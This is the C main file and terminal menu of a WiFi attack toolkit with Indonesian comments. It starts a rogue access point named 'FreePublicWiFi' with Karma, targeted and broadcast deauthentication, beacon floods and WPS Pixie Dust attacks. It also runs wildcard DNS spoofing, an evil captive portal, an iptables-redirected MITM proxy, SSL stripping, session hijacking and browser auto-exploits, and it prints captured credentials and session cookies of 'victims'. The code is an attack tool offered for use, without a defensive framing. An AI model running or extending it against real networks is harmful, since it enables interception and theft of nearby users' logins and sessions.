/*
 * ============================================================================
 * PROYEK     : WiFi Pineapple Pure C Enterprise Engine
 * VERSI      : v15.4 (Complete Annotated Edition with Deep Header Architecture)
 * DESKRIPSI  : Titik Masuk Utama & Antarmuka Dasbor Terminal Terpadu
 * ============================================================================
 */

// --- 1. Header Standar C & POSIX ---
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>

// --- 2. Seluruh Header Modul Sistem Proyek (Fase 1 s/d 11) ---
#include "config.h"
#include "utils/utils.h"
#include "utils/logger.h"
#include "core/rogue_ap.h"
#include "core/sniffer.h"
#include "core/channel_hopper.h"
#include "attack/karma.h"
#include "attack/deauth.h"
#include "attack/beacon_flood.h"
#include "attack/wps_attack.h"
#include "server/dhcp.h"
#include "server/dns.h"
#include "server/evil_portal.h"
#include "mitm/capture.h"
#include "mitm/session_hijack.h"
#include "mitm/proxy.h"
#include "capture/handshake.h"
#include "capture/client_db.h"
#include "modules/module.h"
#include "modules/multi_target.h"
#include "modules/auto_exploit.h"
#include "filter/filter.h"
#include "report/report.h"

// State Konfigurasi Global
static ap_config_t g_cfg;
static volatile int g_running = 1;
static int g_ap_started = 0;

/*
 * === FUNGSI: on_sig() ===
 * Tujuan   : Handler sinyal interupsi Ctrl+C
 */
static void on_sig(int s) { 
    (void)s; 
    g_running = 0; 
}

/*
 * === FUNGSI: print_dashboard() ===
 * Tujuan   : Merender visual antarmuka dashboard CLI ke layar terminal
 */
static void print_dashboard(void) {
    printf("\n╔═════════════════════════════════════════════════════════════════╗\n");
    printf("║   🍍 WiFi Pineapple CLI v15.4 (Enterprise Pure C Architecture)  ║\n");
    printf("╠═════════════════════════════════════════════════════════════════╣\n");
    printf("║ AP Dev: %-6s | MON Dev: %-6s | Status AP: %-3s             ║\n",
           g_cfg.ap_iface, g_cfg.monitor_iface, g_ap_started ? "ON" : "OFF");
    printf("║ Karma : %-3s   | Hopper : %-3s   | AutoExp  : %-3s | HShake: %-3s  ║\n",
           g_cfg.karma_enabled ? "ON" : "OFF", g_cfg.channel_hopping_enabled ? "ON" : "OFF",
           g_cfg.auto_exploit_enabled ? "ON" : "OFF", g_cfg.handshake_capture_enabled ? "ON" : "OFF");
    printf("║ SSLStp: %-3s   | SessHjk: %-3s   | BrwsrExp : %-3s | AdvMIT: %-3s  ║\n",
           g_cfg.ssl_strip_enabled ? "ON" : "OFF", g_cfg.session_hijack_enabled ? "ON" : "OFF",
           g_cfg.browser_exploit_enabled ? "ON" : "OFF", g_cfg.advanced_mitm_enabled ? "ON" : "OFF");
    printf("╠═════════════════════════════════════════════════════════════════╣\n");
    printf("║  1. Scan Wi-Fi Sekitar        18. Tampilkan Handshake WPA       ║\n");
    printf("║  2. Start Rogue AP + Sniffer  19. Tampilkan Client Database     ║\n");
    printf("║  3. Toggle Karma Attack       20. Toggle Channel Hopper         ║\n");
    printf("║  4. Deauth Single Client      21. Multi-Target Attack           ║\n");
    printf("║  5. Deauth Broadcast AP       22. Toggle Auto-Exploit           ║\n");
    printf("║  6. Beacon Flood Attack       23. Kelola Aturan Filter MITM     ║\n");
    printf("║  7. WPS Pixie Dust Attack     24. Generate Laporan Audit        ║\n");
    printf("║  8. Start DHCP + DNS Server   25. Muat Plugin Modul (.so)       ║\n");
    printf("║  9. Start Evil Captive Portal 26. Setup Virtual Interface       ║\n");
    printf("║ 10. Start Proxy HTTP MITM     27. Setup Transparent Proxy       ║\n");
    printf("║ 11. Toggle SSL Strip          28. Stop Rogue AP                 ║\n");
    printf("║ 12. Toggle Session Hijack     29. Stop Deauth Engine            ║\n");
    printf("║ 13. Toggle Browser Exploit    30. Stop DHCP + DNS Server        ║\n");
    printf("║ 14. Toggle Advanced MITM      31. Stop Evil Portal              ║\n");
    printf("║ 15. Toggle Handshake Capture  32. Stop Proxy HTTP               ║\n");
    printf("║ 16. Tampilkan Kredensial       0. Keluar dari Program           ║\n");
    printf("║ 17. Tampilkan Cookie Sesi                                       ║\n");
    printf("╚═════════════════════════════════════════════════════════════════╝\n");
    printf("Pilih Opsi [0-32]: ");
}

static void read_line(char *buf, int size) {
    fgets(buf, size, stdin);
    buf[strcspn(buf, "\n")] = 0;
}

int main(void) {
    // 1. Daftarkan handler sinyal Ctrl+C
    signal(SIGINT, on_sig);

    // 2. Inisialisasi konfigurasi default
    memset(&g_cfg, 0, sizeof(g_cfg));
    get_random_mac(g_cfg.bssid);
    strcpy(g_cfg.ssid, "FreePublicWiFi");
    g_cfg.channel = 6;
    strcpy(g_cfg.monitor_iface, "wlan1");
    strcpy(g_cfg.ap_iface, "wlan0");
    g_cfg.beacon_interval_ms = 100;
    g_cfg.channel_hop_interval_ms = 500;
    g_cfg.deauth_reason = REASON_CLASS3_FRAME;
    g_cfg.deauth_burst = 10;
    g_cfg.portal_port = 80;
    g_cfg.proxy_port = 8080;

    // 3. Inisialisasi seluruh subsistem inti
    logger_init("pineapple.log");
    client_db_init();
    filter_init();
    module_init();
    log_event(LOG_INFO, "WiFi Pineapple Enterprise v15.4 Siap Beroperasi");

    int choice = -1;
    do {
        print_dashboard();
        if (scanf("%d", &choice) != 1) {
            while (getchar() != '\n'); 
            continue;
        }
        getchar(); // Bersihkan sisa newline

        switch (choice) {
        case 1: {
            // FIX #10: Scan memerlukan managed mode, tolak jika Rogue AP sedang aktif
            if (g_ap_started) {
                log_event(LOG_WARN, "Stop AP terlebih dahulu sebelum scan (butuh managed mode)");
                break;
            }
            char cmd[256];
            snprintf(cmd, sizeof(cmd),
                "iw dev %s scan | grep -E 'SSID|signal'", g_cfg.ap_iface);
            system(cmd); 
            break;
        }

        case 2:
            if (g_ap_started) { 
                log_event(LOG_WARN, "Rogue AP sudah berjalan!"); 
                break; 
            }
            if (strcmp(g_cfg.ap_iface, g_cfg.monitor_iface) == 0) {
                log_event(LOG_ERROR, "Interface AP dan Monitor harus merupakan perangkat berbeda!"); 
                break;
            }
            if (set_interface_promisc(g_cfg.monitor_iface, true) < 0) break;
            set_interface_channel(g_cfg.monitor_iface, g_cfg.channel);

            if (start_rogue_ap(&g_cfg) < 0) break;
            
            // Luncurkan thread Beacon dan Sniffer
            {
                pthread_t t1;
                // FIX #4: Cek return value pthread_create
                if (pthread_create(&t1, NULL, beacon_thread, &g_cfg) == 0) {
                    pthread_detach(t1);
                }
                sniffer_start(&g_cfg);
                g_ap_started = 1;
                log_event(LOG_INFO, "Rogue AP & Sniffer Berhasil Diaktifkan");
            }
            break;

        case 3:
            g_cfg.karma_enabled = !g_cfg.karma_enabled;
            log_event(LOG_INFO, "Karma Attack sekarang: %s", g_cfg.karma_enabled ? "ON" : "OFF");
            break;

        case 4: {
            // FIX #12: Guard AP harus aktif sebelum melancarkan deauth
            if (!g_ap_started) {
                log_event(LOG_WARN, "Aktifkan AP dan Sniffer terlebih dahulu!");
                break;
            }
            char mac_str[32];
            printf("Masukkan MAC Target Korban (AA:BB:CC:DD:EE:FF): ");
            read_line(mac_str, sizeof(mac_str));
            uint8_t target_mac[6];
            if (parse_mac(mac_str, target_mac) == 0) {
                deauth_start(g_cfg.monitor_iface, g_cfg.bssid, target_mac,
                             g_cfg.deauth_reason, g_cfg.deauth_burst);
            } else {
                printf("[-] Format MAC tidak valid!\n");
            }
            break;
        }

        case 5: {
            // FIX #12: Guard AP harus aktif
            if (!g_ap_started) {
                log_event(LOG_WARN, "Aktifkan AP dan Sniffer terlebih dahulu!");
                break;
            }
            log_event(LOG_ALERT, "Mengirimkan 20 frame Deauth Broadcast ke BSSID AP kita...");
            send_deauth_broadcast(g_cfg.monitor_iface, g_cfg.bssid, g_cfg.deauth_reason, 20);
            break;
        }

        case 6: {
            int count = 16;
            printf("Jumlah SSID palsu [default 16]: ");
            char cbuf[16]; read_line(cbuf, sizeof(cbuf));
            if (strlen(cbuf) > 0) count = atoi(cbuf);
            beacon_flood_start(g_cfg.monitor_iface, g_cfg.channel, count);
            break;
        }

        case 7: {
            char b_str[32]; int ch;
            printf("BSSID Target WPS: "); read_line(b_str, sizeof(b_str));
            printf("Kanal Target: ");
            if (scanf("%d", &ch) == 1) {
                getchar();
                uint8_t b_mac[6];
                if (parse_mac(b_str, b_mac) == 0) {
                    wps_attack_start(g_cfg.monitor_iface, b_mac, ch);
                }
            } else while (getchar() != '\n');
            break;
        }

        case 8:
            dhcp_start(&g_cfg);
            dns_start(&g_cfg);
            dns_add_spoof("*", "192.168.1.1"); // Wildcard spoof ke IP AP kita
            break;

        case 9:
            evil_portal_start(&g_cfg);
            break;

        case 10:
            proxy_start(&g_cfg);
            break;

        case 11:
            g_cfg.ssl_strip_enabled = !g_cfg.ssl_strip_enabled;
            log_event(LOG_INFO, "SSL Strip sekarang: %s", g_cfg.ssl_strip_enabled ? "ON" : "OFF");
            break;

        case 12:
            g_cfg.session_hijack_enabled = !g_cfg.session_hijack_enabled;
            log_event(LOG_INFO, "Session Hijack sekarang: %s", g_cfg.session_hijack_enabled ? "ON" : "OFF");
            break;

        case 13:
            g_cfg.browser_exploit_enabled = !g_cfg.browser_exploit_enabled;
            log_event(LOG_INFO, "Browser Exploit sekarang: %s", g_cfg.browser_exploit_enabled ? "ON" : "OFF");
            break;

        case 14:
            g_cfg.advanced_mitm_enabled = !g_cfg.advanced_mitm_enabled;
            log_event(LOG_INFO, "Advanced MITM sekarang: %s", g_cfg.advanced_mitm_enabled ? "ON" : "OFF");
            break;

        case 15:
            g_cfg.handshake_capture_enabled = !g_cfg.handshake_capture_enabled;
            if (g_cfg.handshake_capture_enabled) handshake_init("handshake.cap");
            else handshake_cleanup();
            log_event(LOG_INFO, "Handshake Capture sekarang: %s", g_cfg.handshake_capture_enabled ? "ON" : "OFF");
            break;

        case 16: {
            printf("\n=== BUKTI KREDENSIAL TERTANGKAP ===\n");
            FILE *fp = fopen("pineapple.log", "r");
            if (fp) {
                char line[256];
                while (fgets(line, sizeof(line), fp)) {
                    if (strstr(line, "KREDENSIAL TERTANGKAP")) printf("%s", line);
                }
                fclose(fp);
            }
            printf("===================================\n");
            break;
        }

        case 17: {
            printf("\n=== BUKTI COOKIE SESI TERTANGKAP ===\n");
            FILE *fp = fopen("pineapple.log", "r");
            if (fp) {
                char line[256];
                while (fgets(line, sizeof(line), fp)) {
                    if (strstr(line, "COOKIE SESI TERTANGKAP")) printf("%s", line);
                }
                fclose(fp);
            }
            printf("====================================\n");
            break;
        }

        case 18: {
            printf("\n=== STATUS FILE HANDSHAKE CAPTURE ===\n");
            FILE *fp = fopen("handshake.cap", "rb");
            if (fp) {
                fseek(fp, 0, SEEK_END);
                printf("[+] File 'handshake.cap' aktif: Ukuran %ld bytes\n", ftell(fp));
                fclose(fp);
            } else {
                printf("[-] File 'handshake.cap' belum terbentuk\n");
            }
            printf("======================================\n");
            break;
        }

        case 19: {
            client_t list[MAX_CLIENTS];
            int count = client_db_list(list, MAX_CLIENTS);
            printf("\n=== CLIENT DATABASE RADAR (%d TERDETEKSI) ===\n", count);
            for (int i = 0; i < count; i++) {
                char m[18]; format_mac(list[i].mac, m);
                printf("[%d] MAC: %s | IP: %-15s | Status: %s\n",
                       i + 1, m, strlen(list[i].ip) > 0 ? list[i].ip : "N/A",
                       list[i].is_connected ? "TERHUBUNG (VICTIM)" : "Probing");
            }
            printf("=============================================\n");
            break;
        }

        case 20:
            g_cfg.channel_hopping_enabled = !g_cfg.channel_hopping_enabled;
            if (g_cfg.channel_hopping_enabled) channel_hopper_start(&g_cfg);
            else channel_hopper_stop();
            log_event(LOG_INFO, "Channel Hopper sekarang: %s", g_cfg.channel_hopping_enabled ? "ON" : "OFF");
            break;

        case 21:
            multi_target_print();
            printf("Ketik 'add' untuk tambah target, 'attack' untuk serang: ");
            char mt_cmd[16]; read_line(mt_cmd, sizeof(mt_cmd));
            if (strcmp(mt_cmd, "add") == 0) {
                char t_mac[32]; printf("MAC: "); read_line(t_mac, sizeof(t_mac));
                uint8_t m[6];
                if (parse_mac(t_mac, m) == 0) multi_target_add(m);
            } else if (strcmp(mt_cmd, "attack") == 0) {
                multi_target_attack_all(&g_cfg);
            }
            break;

        case 22:
            if (g_cfg.auto_exploit_enabled) auto_exploit_stop(&g_cfg);
            else auto_exploit_start(&g_cfg);
            break;

        case 23: {
            printf("Tambah Aturan Filter? [y/n]: ");
            char ans[4]; read_line(ans, sizeof(ans));
            if (ans[0] == 'y') {
                char pat[128]; int t;
                printf("Pattern String: "); read_line(pat, sizeof(pat));
                printf("Tipe (0=URL, 1=Body, 2=Header): ");
                if (scanf("%d", &t) == 1) {
                    getchar();
                    printf("Blokir? [y/n]: ");
                    char b[4]; read_line(b, sizeof(b));
                    filter_add_rule(pat, t, b[0] == 'y');
                } else while (getchar() != '\n');
            }
            break;
        }

        case 24:
            report_generate("report_audit.txt");
            break;

        case 25: {
            char p[256]; 
            printf("Jalur Berkas Plugin .so: "); 
            read_line(p, sizeof(p));
            if (strlen(p) > 0) { 
                module_load(p); 
                module_list(); 
            }
            break;
        }

        case 26: {
            if (g_ap_started) { 
                log_event(LOG_WARN, "Stop Rogue AP terlebih dahulu!"); 
                break; 
            }
            printf("[*] Menyiapkan virtual interface pada kartu tunggal...\n");
            system("iw dev wlan0 interface add mon0 type monitor");
            system("ip link set dev mon0 up");
            strcpy(g_cfg.monitor_iface, "mon0");
            log_event(LOG_INFO, "Virtual Interface mon0 berhasil dibuat");
            break;
        }

        case 27:
            printf("[*] Mengonfigurasi iptables transparent proxy port 80 -> 8080...\n");
            system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080");
            log_event(LOG_INFO, "Transparent proxy iptables aktif");
            break;

        case 28: {
            if (!g_ap_started) break;
            beacon_flood_stop();
            g_cfg.ap_running = false;
            if (g_cfg.channel_hopping_enabled) {
                channel_hopper_stop();
                g_cfg.channel_hopping_enabled = false;
            }
            sniffer_stop();
            sleep(1);
            close_tx_socket();
            g_ap_started = 0;
            log_event(LOG_INFO, "Rogue AP Berhasil Dihentikan");
            break;
        }

        case 29: {
            // FIX #2: Hanya reset jika deauth thread benar-benar berhenti (return 0)
            if (deauth_stop_all_wait(3000) == 0) {
                log_event(LOG_INFO, "Seluruh thread Deauth berhasil dihentikan");
                deauth_reset();
            } else {
                log_event(LOG_WARN, "Timeout deauth shutdown — thread masih bekerja, NOT resetting");
            }
            break;
        }

        case 30: 
            dhcp_stop(); 
            dns_stop();
            log_event(LOG_INFO, "Layanan DHCP & DNS Dihentikan"); 
            break;

        case 31: 
            evil_portal_stop();
            log_event(LOG_INFO, "Evil Captive Portal Dihentikan"); 
            break;

        case 32: 
            proxy_stop();
            log_event(LOG_INFO, "Proxy HTTP Interceptor Dihentikan"); 
            break;

        case 0: 
            log_event(LOG_INFO, "Keluar dari program..."); 
            break;

        default: 
            log_event(LOG_WARN, "Pilihan tidak valid!"); 
            break;
        }
    } while (choice != 0 && g_running);

    // ========================================================================
    // PEMBERSIHAN SUMBER DAYA SISTEM (GRACEFUL SHUTDOWN)
    // ========================================================================
    printf("\n[*] Membersihkan seluruh socket, thread, dan memori...\n");
    g_cfg.ap_running = false;
    deauth_stop_all_wait(3000);
    close_deauth_socket(); // FIX #16 & #20: Tutup socket deauth
    sniffer_stop();
    beacon_flood_stop();
    channel_hopper_stop();
    dhcp_stop();
    dns_stop();
    evil_portal_stop();
    proxy_stop();
    close_tx_socket();
    module_cleanup();      // FIX #21: Bersihkan shared libraries
    logger_close();

    printf("[✓] Seluruh subsistem berhasil dirapikan. Sistem dimatikan dengan aman!\n");
    return 0;
}
